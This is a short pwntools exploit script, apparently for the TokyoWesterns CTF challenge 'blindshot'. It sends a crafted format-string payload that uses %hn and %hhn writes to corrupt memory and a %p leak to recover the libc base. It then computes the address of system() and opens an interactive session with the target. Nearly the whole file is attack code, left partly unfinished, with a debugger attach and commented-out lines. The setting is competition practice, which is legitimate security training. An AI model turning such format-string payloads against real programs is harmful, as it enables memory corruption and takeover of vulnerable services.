from pwn import *
import sys

LIBC = ELF('./libc-2.31.so')
if(len(sys.argv)>1):
    io=remote("pwn01.chal.ctf.westerns.tokyo",12463)
    context.noptrace = True
else:
    io=process("./blindshot")

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

if __name__ == "__main__":
    gdb.attach(io)
    
    payload =('%3320c')*16 + '%3328c' + '%18hn' + '%9089c'+ '%46$hhn' + '%16$p'
    #payload += ('%3570c')*16 + '%8c' + '%18hn'
    sla('> ',payload)
    re(1)
    libc = int(re(14),16) - 0x270b3
    system = libc + LIBC.symbols['system']
    #binsh = libc + next(LIBC.search['/bin/sh'])
    log.info('libc: ' + hex(libc))
    io.interactive()
